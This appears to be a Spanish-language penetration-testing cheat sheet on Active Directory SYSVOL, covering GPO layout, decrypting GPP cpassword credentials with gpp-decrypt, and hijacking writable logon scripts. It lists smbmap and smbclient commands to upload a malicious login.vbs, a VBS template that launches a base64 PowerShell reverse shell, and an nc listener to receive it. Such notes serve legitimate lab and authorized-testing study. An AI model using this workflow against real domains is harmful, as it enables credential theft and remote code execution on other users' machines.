# SYSVOL

Tags: #SysVol #GPP #GPO #Loginvbs 

SysVol (abreviatura de System Volume) es un conjunto de carpetas y archivos que se comparten en toda una infraestructura de AD. Está presente en todos los controladores de dominio de un entorno de AD.
    
1. Contenido y Estructura: 
    - Políticas y Scripts: Contiene las políticas de grupo (GPOs) y scripts de inicio/apagado e inicio/cierre de sesión.  
    - Archivos de Plantilla: Incluye archivos de plantilla de políticas de grupo (Administrative Templates), que son archivos '.admx' y '.adml'.
    - Información de Replicación: SysVol se replica entre todos los controladores de dominio para asegurar la coherencia de las políticas y configuraciones. 
2. Ubicación y Acceso: Por lo general, se accede a través de la red utilizando una ruta UNC (Universal Naming Convention), como '\\[Nombre_Dominio]\SysVol'.

```bash 
# Estructura de una GPO:
<dominio>/
└── Policies/
    ├── {31B2F340-016D-11D2-945F-00C04FB984F9}/
    └── {6AC1786C-016F-11D2-945F-00C04fB984F9}/

# Dentro se encuentran cosas como:
{GUID}/
├── GPT.INI
├── MACHINE/
│   ├── Microsoft/
│   ├── Registry.pol
│   └── Scripts/
└── USER/

# Saber si es una GPO
SYSVOL/<dominio>/Policies/{GUID}/

# Encontrar un logonscript 
USER/
└── Scripts/
    └── Logon/

MACHINE/
└── Scripts/
    └── Startup/
```

## 1. GPP (Group Policy Preferences) / cpassword 

Permite a los administradores configurar preferencias de usuarios/equipos mediante GPO. En versiones antiguas, algunas preferencias podían almacenar credenciales en `SYSVOL` dentro de archivos como `Groups.xml` usando `cpassword`.

Lectura:
→ Permite descubrir/revisar el script.
→ Buscar credenciales, rutas, información sensible, etc.

```powershell
# Ruta típica 
\\<DOMINIO>\SYSVOL\<DOMINIO>\Policies\<GPO-GUID>\Machine\Preferences\Groups\Groups.xml
 
❯ gpp-decrypt 'password'    # Descifrar la password por medio de la clave AES para obtenerla en texto claro
```

## 2. Logonscript

Un **Logon Script** es un script que Windows ejecuta cuando un usuario inicia sesión. Puede estar configurado mediante una GPO y normalmente encontrarse en `SYSVOL`.

- En BloodHound se puede ver si el usuario tiene un logonscript. 

```bash 
logonscript: \<DOMINIO>\SYSVOL\<DOMINIO>\scripts\login.vbs
```

Lectura:
→ Permite descubrir/revisar el script.
→ Buscar credenciales, rutas, información sensible, etc.

Escritura:
→ Si tengo permisos de escritura sobre el directorio donde está el
  Logon Script y ese script se ejecuta para otros usuarios,
  potencialmente puedo modificarlo/reemplazarlo.

```bash 
# Tener permisos de lectura y escritura en Sysvol 
❯ smbmap -H IP_DC -u user -p 'passwd' 

# Ingresar al directorio
❯ smbclient //IP_DC/SYSVOL -u 'user%passwd'
	❯ put login.vbs     # Subir el archivo en la ruta encontrada '/scripts'


NOTA:
	- A veces solo hay que subir un archivo con 'put' para saber si se tiene permisos de escritura en SYSVOL
```

* [Revershell](https://www.revshells.com/)
### Revershell para .VBS
```bash 
# Generar la revershell colocando el código dentro del archivo 'login.vbs'

	Set objShell = CreateObject("WScript.Shell")
	objShell.Run "powershell -e BASE64"


NOTA:
	- Escoger la revershell lamada 'Powershell #3 (Base64)' y pegar el resultado arriba
```

```bash 
❯ rlwrap nc -nlvp 9001   # Recibir la revershell 
```